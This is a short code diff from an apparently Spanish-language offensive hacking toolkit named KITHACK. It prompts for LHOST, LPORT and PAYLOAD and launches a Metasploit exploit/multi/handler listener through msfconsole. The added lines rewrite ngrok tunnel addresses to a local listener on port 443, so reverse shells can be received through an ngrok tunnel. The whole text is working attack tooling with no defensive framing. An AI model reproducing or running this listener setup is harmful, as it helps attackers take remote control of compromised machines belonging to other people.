@@ -4221,6 +4221,10 @@ def main():
 			LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 			LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 			PAYLOAD = input("\n{0}SET PAYLOAD: {1}".format(YELLOW, DEFAULT))
+			if ".tcp.ngrok.io" in LHOST:
+				LHOST = "127.0.0.1"
+				LPORT = "443"
+			# continue
 			os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {}; set LPORT {}; set PAYLOAD {}; exploit\'"'.format(LHOST, LPORT, PAYLOAD))
 			pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 			os.system('clear')
